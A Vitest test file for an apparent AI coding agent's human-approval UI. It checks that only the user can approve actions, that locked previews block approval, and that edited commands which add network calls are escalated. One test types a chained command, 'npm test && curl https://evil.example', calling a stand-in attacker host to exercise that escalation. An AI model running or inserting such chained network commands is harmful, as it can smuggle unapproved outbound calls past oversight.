import React from "react";
import { describe, expect, it, vi } from "vitest";
import { fireEvent, render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { DevAppShell } from "@/components/shell/DevAppShell";
import { P10ApprovalCard } from "@/components/screens/P10ApprovalCard";
import { TasksWorkspace } from "@/components/screens/TasksWorkspace";
import type {
  FileDiffHunk,
  P10ApprovalDecisionPayload,
  P10ApprovalProposal,
  StepReceiptItem,
} from "@/lib/types";
import { runAxe } from "@/test/setup";
import "@/styles/tokens.css";

function makeProposal(overrides: Partial<P10ApprovalProposal> = {}): P10ApprovalProposal {
  return {
    id: "prop-cmd-101",
    taskId: "task-1",
    kind: "command",
    title: "Run Vitest unit suite in Seatbelt",
    summary: "Execute unit tests inside workspace-scoped sandbox.",
    whyReason: "Verify P-10 approval invariants before patching main.py.",
    command: "npm test",
    workingDir: "/workspace/keelway/dev-app",
    previewStatus: "ready",
    modelId: "coder-7b",
    modelVersion: "2.5.1",
    promptVersion: "p-14",
    confidence: "Medium",
    createdAt: "2026-11-14T03:00:00Z",
    recordSeqCandidate: 1284,
    ...overrides,
  };
}

const SAMPLE_RECEIPTS: StepReceiptItem[] = [
  {
    id: "step-read-1",
    kind: "read",
    title: "Read file",
    target: "core/main.py",
    detail: "Read lines 1–42 (UTF-8)",
    output: 'app = FastAPI(title="Keelway Sovereign Runtime")',
    status: "ready",
    recordSeq: 1280,
  },
  {
    id: "step-search-1",
    kind: "searched",
    title: "Searched symbols",
    target: "requires_human_quorum",
    detail: "2 matches across core/security/",
    output: "core/security/policy.py:3: def requires_human_quorum(...)",
    status: "ready",
    recordSeq: 1281,
  },
  {
    id: "step-edit-1",
    kind: "edited",
    title: "Edited file",
    target: "core/main.py",
    detail: "+3 / -1 lines staged in working tree",
    output: "+ _STUDIO_CSP = \"default-src 'self'\"",
    status: "ready",
    linesAdded: 3,
    linesRemoved: 1,
    recordSeq: 1282,
  },
  {
    id: "step-test-pass",
    kind: "test",
    title: "Ran pytest suite",
    target: "pytest tests/test_policy.py -q",
    output: "4 passed in 0.18s",
    status: "passed",
    exitCode: 0,
    durationMs: 180,
    recordSeq: 1283,
  },
  {
    id: "step-test-fail",
    kind: "test",
    title: "Ran CSP header check",
    target: "pytest tests/test_csp.py -q",
    output: "FAILED tests/test_csp.py::test_strict_self_csp - AssertionError",
    status: "failed",
    exitCode: 1,
    durationMs: 210,
    recordSeq: 1284,
  },
];

const SAMPLE_DIFF_HUNKS: FileDiffHunk[] = [
  {
    path: "core/main.py",
    oldStart: 4,
    newStart: 4,
    additions: 3,
    deletions: 1,
    aiRecordSeq: 1283,
    lines: [
      { type: "hunk", content: "@@ -4,4 +4,6 @@" },
      {
        type: "context",
        oldLine: 4,
        newLine: 4,
        content: 'app = FastAPI(title="Keelway Sovereign Runtime", version="1.1.0")',
      },
      { type: "del", oldLine: 5, content: 'CSP_POLICY = "default-src *"' },
      {
        type: "add",
        newLine: 5,
        content: "_STUDIO_CSP = \"default-src 'self'; script-src 'self'; object-src 'none'\"",
      },
    ],
  },
];

describe("Task 3 — Inline P-10 Human-Only Gate & TasksWorkspace Safety Invariants", () => {
  it("Gate 1: enforces Zero Focus-Steal on incoming P10ApprovalCard, announces politely, and isolates Cmd+Enter to composer", async () => {
    const user = userEvent.setup();
    const onSendPrompt = vi.fn();
    const onSubmitDecision = vi.fn();

    function Harness({ proposals }: { proposals: P10ApprovalProposal[] }): React.JSX.Element {
      const [announcement, setAnnouncement] = React.useState("");
      const headingRef = React.useRef<HTMLHeadingElement | null>(null);
      return (
        <DevAppShell
          activeSection="tasks"
          onSelectSection={() => {}}
          pendingApprovalCount={proposals.length}
          onJumpToApprovalHeading={() => headingRef.current?.focus()}
          politeAnnouncement={announcement}
        >
          <TasksWorkspace
            taskTitle="Harden loopback CSP headers"
            proposals={proposals}
            approvalHeadingRef={headingRef}
            onPoliteAnnouncement={setAnnouncement}
            onSendPrompt={onSendPrompt}
            onSubmitDecision={onSubmitDecision}
          />
        </DevAppShell>
      );
    }

    const { rerender } = render(<Harness proposals={[]} />);

    const composer = screen.getByRole("textbox", { name: /Ask agent|Instruction|Composer/i });
    await user.click(composer);
    await user.type(composer, "Verify script-src self header");
    expect(composer).toHaveFocus();

    // Dynamically inject a newly arrived P-10 proposal while user is typing in composer
    const incomingProposal = makeProposal({
      id: "prop-edit-201",
      kind: "file_edit",
      title: "Patch CSP policy in core/main.py",
      targetPath: "core/main.py",
      diffLines: SAMPLE_DIFF_HUNKS[0].lines,
    });
    rerender(<Harness proposals={[incomingProposal]} />);

    // Zero focus steal: activeElement MUST remain on composer textarea
    expect(document.activeElement).toBe(composer);

    // Polite live region announces pending approval without stealing focus
    const politeRegion = screen.getByTestId("shell-polite-announcer");
    expect(politeRegion).toHaveTextContent(/Patch CSP policy in core\/main\.py/i);

    // Pressing Meta+Enter inside composer submits ONLY the composer message, NEVER approving P-10
    fireEvent.keyDown(composer, { key: "Enter", metaKey: true });
    expect(onSendPrompt).toHaveBeenCalledTimes(1);
    expect(onSendPrompt).toHaveBeenCalledWith("Verify script-src self header");
    expect(onSubmitDecision).not.toHaveBeenCalled();

    // Slash "/" menu filtering + ArrowDown/Escape/Enter insertion inserts "/qa " without submitting or approving P-10
    await user.type(composer, "/");
    const fullSlashListbox = screen.getByRole("listbox", { name: /Slash skills/i });
    expect(within(fullSlashListbox).getAllByRole("option").length).toBeGreaterThanOrEqual(5);
    fireEvent.keyDown(composer, { key: "ArrowDown" });
    fireEvent.keyDown(composer, { key: "Escape" });
    expect(screen.queryByRole("listbox", { name: /Slash skills/i })).toBeNull();

    await user.clear(composer);
    await user.type(composer, "/rev");
    const slashListbox = screen.getByRole("listbox", { name: /Slash skills/i });
    expect(within(slashListbox).getByRole("option", { name: /\/review/i })).toBeInTheDocument();
    expect(within(slashListbox).queryByRole("option", { name: /\/ship/i })).toBeNull();
    fireEvent.keyDown(composer, { key: "Enter" });
    expect(composer).toHaveValue("/review ");
    expect(screen.queryByRole("listbox", { name: /Slash skills/i })).toBeNull();
    expect(onSendPrompt).toHaveBeenCalledTimes(1);
    expect(onSubmitDecision).not.toHaveBeenCalled();

    // Runtime unreachable keeps textarea editable while soft-disabling Send so drafts are preserved
    const offlineView = render(
      <TasksWorkspace
        taskTitle="Offline draft check"
        runtimeReachable={false}
        onSendPrompt={onSendPrompt}
      />,
    );
    const offlineTextarea = within(offlineView.container).getByRole("textbox", {
      name: /Ask agent|Instruction|Composer/i,
    });
    await user.type(offlineTextarea, "Draft saved locally");
    expect(offlineTextarea).toHaveValue("Draft saved locally");
    const sendBtn = within(offlineView.container).getByRole("button", { name: /^Send/i });
    expect(sendBtn).toHaveAttribute("aria-disabled", "true");
    fireEvent.keyDown(offlineTextarea, { key: "Enter", metaKey: true });
    expect(offlineTextarea).toHaveValue("Draft saved locally");
    offlineView.unmount();
  });

  it("Gate 2: Cmd+Shift+A jumps focus strictly to the P-10 <h3 tabIndex={-1} data-programmatic-focus='true'> heading, never to Allow once", () => {
    const headingRef = React.createRef<HTMLHeadingElement>();
    const proposal = makeProposal({ title: "Approve sandboxed pytest execution" });

    render(
      <DevAppShell
        activeSection="tasks"
        onSelectSection={() => {}}
        pendingApprovalCount={1}
        onJumpToApprovalHeading={() => headingRef.current?.focus()}
      >
        <TasksWorkspace
          taskTitle="Run verification"
          proposals={[proposal]}
          approvalHeadingRef={headingRef}
        />
      </DevAppShell>,
    );

    const allowOnceBtn = screen.getByRole("button", { name: /Allow once/i });
    expect(allowOnceBtn).not.toHaveFocus();

    fireEvent.keyDown(window, { key: "A", metaKey: true, shiftKey: true });

    const active = document.activeElement as HTMLElement | null;
    expect(active).not.toBeNull();
    expect(active?.tagName).toBe("H3");
    expect(active).toHaveAttribute("tabindex", "-1");
    expect(active).toHaveAttribute("data-programmatic-focus", "true");
    expect(active).toHaveTextContent("Approve sandboxed pytest execution");
    expect(active).not.toBe(allowOnceBtn);
  });

  it("Gate 3: locks Allow once when previewStatus is loading or failed (10b), keeps Deny/Edit/Retry working, and rejects untrusted synthetic clicks", async () => {
    const user = userEvent.setup();
    const onSubmitDecision = vi.fn();
    const onRetryPreview = vi.fn();

    const { rerender } = render(
      <P10ApprovalCard
        proposal={makeProposal({ id: "prop-lock-1", previewStatus: "loading" })}
        onSubmitDecision={onSubmitDecision}
        onRetryPreview={onRetryPreview}
      />,
    );

    // Exact governance footer copy required by bundle & safety spec
    expect(
      screen.getByText(
        "Only you can approve. Agent output never counts as confirmation, and the agent can't approve for you.",
      ),
    ).toBeInTheDocument();

    const allowBtnLoading = screen.getByRole("button", { name: /Allow once/i });
    expect(allowBtnLoading).toHaveAttribute("aria-disabled", "true");
    const describedById = allowBtnLoading.getAttribute("aria-describedby");
    expect(describedById).toBeTruthy();
    const lockNote = document.getElementById(describedById!.split(" ")[0]!);
    expect(lockNote).toHaveTextContent("Allow once unlocks when the preview has loaded.");

    // Clicking locked Allow once or pressing Cmd+Shift+Y MUST NOT dispatch
    await user.click(allowBtnLoading);
    fireEvent.keyDown(window, { key: "Y", metaKey: true, shiftKey: true });
    expect(onSubmitDecision).not.toHaveBeenCalled();

    // Failed preview exposes Retry preview while keeping Allow once locked and Edit + Deny operational
    rerender(
      <P10ApprovalCard
        proposal={makeProposal({
          id: "prop-lock-1",
          previewStatus: "failed",
          previewError: "Diff snapshot timed out in sandbox",
        })}
        onSubmitDecision={onSubmitDecision}
        onRetryPreview={onRetryPreview}
      />,
    );

    const allowBtnFailed = screen.getByRole("button", { name: /Allow once/i });
    expect(allowBtnFailed).toHaveAttribute("aria-disabled", "true");
    await user.click(screen.getByRole("button", { name: /Retry preview/i }));
    expect(onRetryPreview).toHaveBeenCalledWith("prop-lock-1");

    // Edit request works even while preview failed
    await user.click(screen.getByRole("button", { name: /Edit request/i }));
    expect(screen.getByLabelText(/Proposed command/i)).toBeInTheDocument();

    // Deny with optional reason works while preview failed
    const reasonInput = screen.getByLabelText(/Deny reason/i);
    await user.type(reasonInput, "Preview unavailable; rerun diff first");
    await user.click(screen.getByRole("button", { name: /^Deny/i }));
    expect(onSubmitDecision).toHaveBeenCalledTimes(1);
    expect(onSubmitDecision).toHaveBeenLastCalledWith(
      expect.objectContaining({
        proposalId: "prop-lock-1",
        decision: "deny",
        denyReason: "Preview unavailable; rerun diff first",
      }),
    );

    // Fresh ready proposal MUST reject untrusted synthetic click & keydown events, then accept trusted Cmd+Shift+Y
    onSubmitDecision.mockClear();
    const readyView = render(
      <P10ApprovalCard
        proposal={makeProposal({ id: "prop-ready-untrusted", previewStatus: "ready" })}
        onSubmitDecision={onSubmitDecision}
      />,
    );
    const readyAllowBtn = within(readyView.container).getByRole("button", { name: /Allow once/i });
    const untrustedClick = Object.assign(
      new MouseEvent("click", { bubbles: true, cancelable: true }),
      { __kwUntrustedSynthetic: true },
    );
    readyAllowBtn.dispatchEvent(untrustedClick);

    const untrustedKey = Object.assign(
      new KeyboardEvent("keydown", { key: "y", metaKey: true, shiftKey: true, bubbles: true, cancelable: true }),
      { __kwUntrustedSynthetic: true },
    );
    window.dispatchEvent(untrustedKey);
    expect(onSubmitDecision).not.toHaveBeenCalled();

    fireEvent.keyDown(window, { key: "Y", metaKey: true, shiftKey: true });
    expect(onSubmitDecision).toHaveBeenCalledTimes(1);
    expect(onSubmitDecision).toHaveBeenLastCalledWith(
      expect.objectContaining({ proposalId: "prop-ready-untrusted", decision: "allow_once" }),
    );
    readyView.unmount();
  });

  it("Gate 4: enforces 02c Network/Deploy & CRE-231/CRE-42 rules, AT-safe 2-step keyboard confirm, Scoped Rule popover, and Edit B->C escalation", async () => {
    const user = userEvent.setup();
    const onSubmitDecision = vi.fn();

    // 4A. Variant C network_deploy + domainPolicyCode CRE-231 (and CRE-42)
    const { unmount: unmountNet } = render(
      <P10ApprovalCard
        proposal={makeProposal({
          id: "prop-net-301",
          kind: "network_deploy",
          title: "POST bundle to staging.creova.example",
          destinationHost: "staging.creova.example",
          payloadBytesEstimate: 4096,
          domainPolicyCode: "CRE-231",
          confidence: "Low",
        })}
        onSubmitDecision={onSubmitDecision}
      />,
    );

    // Allow always (scoped) and Cmd+Shift+Y / Cmd+Shift+N hints MUST be completely absent
    expect(screen.queryByRole("button", { name: /Allow always/i })).toBeNull();
    expect(screen.queryByText("⌘⇧Y")).toBeNull();
    expect(screen.queryByText("⌘⇧N")).toBeNull();
    expect(screen.getByText(/CRE-231/)).toBeInTheDocument();

    // Keyboard chords Cmd+Shift+Y / Cmd+Shift+N MUST do nothing on Variant C / domain-regulated
    fireEvent.keyDown(window, { key: "Y", metaKey: true, shiftKey: true });
    fireEvent.keyDown(window, { key: "N", metaKey: true, shiftKey: true });
    expect(onSubmitDecision).not.toHaveBeenCalled();

    // Keyboard activation (detail === 0 while activeElement === allowOnceButton) opens untimed 2-step confirm
    const netAllowBtn = screen.getByRole("button", { name: /Allow once/i });
    netAllowBtn.focus();
    expect(document.activeElement).toBe(netAllowBtn);
    fireEvent.click(netAllowBtn, { detail: 0 });
    expect(onSubmitDecision).not.toHaveBeenCalled();

    const confirmRegion = screen.getByRole("region", { name: /Confirm external send/i });
    expect(confirmRegion).toBeInTheDocument();
    const cancelConfirmBtn = within(confirmRegion).getByRole("button", { name: "Cancel" });
    expect(document.activeElement).toBe(cancelConfirmBtn);
    await user.tab();
    expect(document.activeElement).toBe(
      within(confirmRegion).getByRole("button", { name: /Confirm send once/i }),
    );

    // Cancel closes inline confirmation without dispatching
    await user.click(cancelConfirmBtn);
    expect(screen.queryByRole("region", { name: /Confirm external send/i })).toBeNull();
    expect(onSubmitDecision).not.toHaveBeenCalled();

    // Re-open via keyboard activation and confirm send once
    netAllowBtn.focus();
    fireEvent.click(netAllowBtn, { detail: 0 });
    const reopenedConfirm = screen.getByRole("region", { name: /Confirm external send/i });
    await user.click(within(reopenedConfirm).getByRole("button", { name: /Confirm send once/i }));
    expect(onSubmitDecision).toHaveBeenCalledTimes(1);
    expect(onSubmitDecision).toHaveBeenLastCalledWith(
      expect.objectContaining({
        proposalId: "prop-net-301",
        decision: "allow_once",
        confirmedExternalSend: true,
      }),
    );
    unmountNet();

    // Verify CRE-42 domain policy on a standard command ALSO strips Allow always & shortcuts
    const cre42View = render(
      <P10ApprovalCard
        proposal={makeProposal({ id: "prop-cre-42", kind: "command", domainPolicyCode: "CRE-42" })}
      />,
    );
    expect(within(cre42View.container).queryByRole("button", { name: /Allow always/i })).toBeNull();
    expect(within(cre42View.container).queryByText("⌘⇧Y")).toBeNull();
    cre42View.unmount();

    // 4B. Variant B ("npm test"): Allow always (scoped) Radix Popover bound to modelId + promptVersion
    onSubmitDecision.mockClear();
    const scopedView = render(
      <P10ApprovalCard
        proposal={makeProposal({
          id: "prop-cmd-scoped",
          kind: "command",
          command: "npm test",
          modelId: "coder-7b",
          promptVersion: "p-14",
        })}
        onSubmitDecision={onSubmitDecision}
      />,
    );
    await user.click(
      within(scopedView.container).getByRole("button", { name: /Allow always \(scoped\)/i }),
    );
    const popoverDialog = await screen.findByRole("dialog", { name: /Allow always in scope/i });
    const scopeInput = within(popoverDialog).getByLabelText(/Scope pattern/i);
    await user.clear(scopeInput);
    await user.type(scopeInput, "npm test -- src/__tests__/*");
    await user.click(within(popoverDialog).getByRole("button", { name: /Save scoped rule/i }));
    expect(onSubmitDecision).toHaveBeenCalledWith(
      expect.objectContaining({
        proposalId: "prop-cmd-scoped",
        decision: "allow_always_scoped",
        scopedRule: expect.objectContaining({
          scopePattern: "npm test -- src/__tests__/*",
          actionKind: "command",
          modelId: "coder-7b",
          promptVersion: "p-14",
        }),
      }),
    );
    scopedView.unmount();

    // Verify unedited command matching network tool stays fail-closed Variant C WITHOUT claiming "escalated by edit"
    const uneditedCurlView = render(
      <P10ApprovalCard
        proposal={makeProposal({ id: "prop-unedited-curl", kind: "command", command: "curl https://api.example.com" })}
      />,
    );
    expect(within(uneditedCurlView.container).queryByRole("button", { name: /Allow always/i })).toBeNull();
    expect(within(uneditedCurlView.container).queryByText("Network + command (escalated by edit)")).toBeNull();
    uneditedCurlView.unmount();

    // 4C. Edit request B -> C Escalation ("npm test" -> "npm test && curl https://evil.example")
    onSubmitDecision.mockClear();
    let capturedPayload: P10ApprovalDecisionPayload | undefined;
    onSubmitDecision.mockImplementation((payload: P10ApprovalDecisionPayload) => {
      capturedPayload = payload;
    });

    render(
      <P10ApprovalCard
        proposal={makeProposal({
          id: "prop-escalate-1",
          kind: "command",
          command: "npm test",
          recordSeqCandidate: 1299,
        })}
        onSubmitDecision={onSubmitDecision}
      />,
    );

    expect(screen.getByRole("button", { name: /Allow always \(scoped\)/i })).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: /Edit request/i }));
    const cmdInput = screen.getByLabelText(/Proposed command/i);
    await user.clear(cmdInput);
    await user.type(cmdInput, "npm test && curl https://evil.example");

    // Automatic B -> C escalation invariants
    expect(screen.getByText("Network + command (escalated by edit)")).toBeInTheDocument();
    expect(screen.queryByRole("button", { name: /Allow always/i })).toBeNull();
    expect(screen.getByText("modified by you")).toBeInTheDocument();
    expect(screen.queryByText("⌘⇧Y")).toBeNull();

    // Cmd+Shift+Y disabled after network escalation
    fireEvent.keyDown(window, { key: "Y", metaKey: true, shiftKey: true });
    expect(onSubmitDecision).not.toHaveBeenCalled();

    // Pointer click on Allow once records modifiedByUser & escalatedByEdit on collapsed 28px Record #seq receipt
    await user.click(screen.getByRole("button", { name: /Allow once/i }));
    expect(onSubmitDecision).toHaveBeenCalledTimes(1);
    expect(capturedPayload).toEqual(
      expect.objectContaining({
        proposalId: "prop-escalate-1",
        decision: "allow_once",
        modifiedCommand: "npm test && curl https://evil.example",
        escalatedToNetwork: true,
      }),
    );

    const receiptRow = screen.getByTestId("p10-receipt-prop-escalate-1");
    expect(receiptRow).toHaveClass("min-h-row");
    expect(receiptRow).toHaveTextContent(/Allowed/i);
    expect(receiptRow).toHaveTextContent("modified by you");
    expect(receiptRow).toHaveTextContent(/escalated by edit/i);
    expect(receiptRow).toHaveTextContent("Record #1299");
  });

  it("Gate 5: renders TasksWorkspace Plan auto-collapse, epistemic receipts, 520px Review Changes, 300px Logs/Terminal/Network, Stop Cmd+., and passes Dark/Light/RTL/Popover axe-core", async () => {
    const user = userEvent.setup();
    const execTerminalSpy = vi.fn().mockResolvedValue({
      stdout: "$ pytest -q\n6 passed in 0.14s\n",
      stderr: "",
      exitCode: 0,
      sandboxed: true,
      durationMs: 42,
    });
    const toggleAirGapSpy = vi.fn().mockImplementation(async (enabled: boolean) => ({
      airGapEnabled: enabled,
      mode: enabled ? ("air_gapped_verified" as const) : ("unmeasured" as const),
      verifiedAt: "2026-11-14T03:10:00Z",
    }));
    const onStopRun = vi.fn();

    const pendingProposal = makeProposal({
      id: "prop-ws-1",
      kind: "command",
      title: "Run integration verifier",
      command: "pytest -q",
    });

    const { unmount } = render(
      <TasksWorkspace
        taskTitle="Harden CSP & verify chain"
        workspaceBranch="feat/unified-dev-app"
        activeModelLabel="coder-7b v2.5.1"
        planSteps={[
          { id: "p1", label: "Inspect core/main.py headers", done: true },
          { id: "p2", label: "Patch _STUDIO_CSP self policy", done: true },
          { id: "p3", label: "Run pytest verification in sandbox", done: false },
        ]}
        stepReceipts={SAMPLE_RECEIPTS}
        proposals={[pendingProposal]}
        diffHunks={SAMPLE_DIFF_HUNKS}
        defaultRunning={true}
        defaultReviewOpen={true}
        defaultLogsOpen={true}
        execTerminalFn={execTerminalSpy}
        toggleAirGapFn={toggleAirGapSpy}
        onStopRun={onStopRun}
      />,
    );

    // 1. PlanCard auto-collapsed to 1-line summary when pending P-10 proposal exists, still manually toggleable
    const planToggle = screen.getByRole("button", { name: /Plan/i });
    expect(planToggle).toHaveAttribute("aria-expanded", "false");
    expect(screen.queryByText("Inspect core/main.py headers")).toBeNull();
    await user.click(planToggle);
    expect(planToggle).toHaveAttribute("aria-expanded", "true");
    expect(screen.getByText("Inspect core/main.py headers")).toBeInTheDocument();

    // 2. Epistemic step receipts: Read, Searched, Edited -> Ready (never Passed); Test -> Passed (exit 0) / Failed (exit != 0)
    const readReceipt = screen.getByTestId("step-receipt-step-read-1");
    const searchReceipt = screen.getByTestId("step-receipt-step-search-1");
    const editReceipt = screen.getByTestId("step-receipt-step-edit-1");
    const passReceipt = screen.getByTestId("step-receipt-step-test-pass");
    const failReceipt = screen.getByTestId("step-receipt-step-test-fail");

    for (const neutralRow of [readReceipt, searchReceipt, editReceipt]) {
      expect(within(neutralRow).getByText("Ready")).toBeInTheDocument();
      expect(within(neutralRow).queryByText("Passed")).toBeNull();
    }
    expect(within(passReceipt).getByText("Passed")).toBeInTheDocument();
    expect(within(failReceipt).getByText("Failed")).toBeInTheDocument();

    // Clicking a receipt expands its output
    await user.click(within(passReceipt).getByRole("button"));
    expect(within(passReceipt).getByText("4 passed in 0.18s")).toBeInTheDocument();

    // 3. Review changes pane (520px w-review) with Keep changes, Revert all, and Ask for changes citation prefill
    const reviewPane = screen.getByRole("complementary", { name: /Review changes/i });
    expect(reviewPane).toHaveClass("w-review");
    expect(within(reviewPane).getByRole("button", { name: /Keep changes/i })).toBeInTheDocument();
    expect(within(reviewPane).getByRole("button", { name: /Revert all/i })).toBeInTheDocument();

    await user.click(within(reviewPane).getByRole("button", { name: /Ask for changes/i }));
    const composer = screen.getByRole("textbox", { name: /Ask agent|Instruction|Composer/i });
    expect((composer as HTMLTextAreaElement).value).toMatch(/core\/main\.py:4/);

    // 4. Logs | Terminal | Network (300px h-[300px]) drawer: sandbox terminal + honest Network · unmeasured + Air-Gap toggle
    const logsRegion = screen.getByRole("region", { name: /Logs and terminal/i });
    expect(logsRegion).toHaveClass("h-[300px]");

    await user.click(within(logsRegion).getByRole("tab", { name: /Terminal/i }));
    const termInput = within(logsRegion).getByLabelText(/Sandbox command/i);
    await user.clear(termInput);
    await user.type(termInput, "pytest -q");
    await user.click(within(logsRegion).getByRole("button", { name: /Run in sandbox/i }));
    expect(execTerminalSpy).toHaveBeenCalledWith("pytest -q");
    expect(await within(logsRegion).findByText(/6 passed in 0\.14s/)).toBeInTheDocument();

    await user.click(within(logsRegion).getByRole("tab", { name: /Network/i }));
    expect(within(logsRegion).getByText(/Network · unmeasured/i)).toBeInTheDocument();
    expect(within(logsRegion).getByText("No counter yet")).toBeInTheDocument();
    expect(within(logsRegion).queryByText("0 B sent")).toBeNull();

    const airGapBtn = within(logsRegion).getByRole("button", { name: /Air-Gap/i });
    await user.click(airGapBtn);
    expect(toggleAirGapSpy).toHaveBeenCalledWith(true);
    expect(await within(logsRegion).findByText(/Air-gapped · verified/i)).toBeInTheDocument();

    // 5. Stop Cmd+. halts active run, and header Logs button shows ⌘J + standalone Cmd+J toggles Logs drawer
    const headerLogsBtn = screen.getByRole("button", { name: /Logs & Terminal/i });
    expect(within(headerLogsBtn).getByText("⌘J")).toBeInTheDocument();
    fireEvent.keyDown(window, { key: "j", metaKey: true });
    expect(screen.queryByRole("region", { name: /Logs and terminal/i })).toBeNull();
    fireEvent.keyDown(window, { key: "j", metaKey: true });
    expect(screen.getByRole("region", { name: /Logs and terminal/i })).toBeInTheDocument();

    fireEvent.keyDown(window, { key: ".", metaKey: true });
    expect(onStopRun).toHaveBeenCalledTimes(1);
    expect(screen.queryByRole("button", { name: /^Stop/i })).toBeNull();

    unmount();

    // 6. Dual-theme (dark/light) + RTL + open Allow always (scoped) Radix Popover WCAG 2.2 AA axe-core audit
    try {
      for (const theme of ["dark", "light"] as const) {
        for (const dir of ["ltr", "rtl"] as const) {
          document.documentElement.setAttribute("data-theme", theme);
          document.documentElement.setAttribute("dir", dir);

          const auditView = render(
            <TasksWorkspace
              taskTitle="Axe WCAG 2.2 AA audit"
              stepReceipts={SAMPLE_RECEIPTS}
              proposals={[pendingProposal]}
              diffHunks={SAMPLE_DIFF_HUNKS}
              defaultReviewOpen={true}
              defaultLogsOpen={true}
            />,
          );

          // Open "/" slash listbox + Allow always (scoped) Radix Popover so both menus are axe-audited
          const auditComposer = within(auditView.container).getByRole("textbox", {
            name: /Ask agent|Instruction|Composer/i,
          });
          await user.type(auditComposer, "/");
          expect(within(auditView.container).getByRole("listbox", { name: /Slash skills/i })).toBeInTheDocument();

          await user.click(
            within(auditView.container).getByRole("button", { name: /Allow always \(scoped\)/i }),
          );
          await screen.findByRole("dialog", { name: /Allow always in scope/i });

          expect(await runAxe(document.body)).toHaveNoViolations();
          auditView.unmount();
        }
      }
    } finally {
      document.documentElement.setAttribute("dir", "ltr");
      document.documentElement.setAttribute("data-theme", "dark");
    }
  });
});
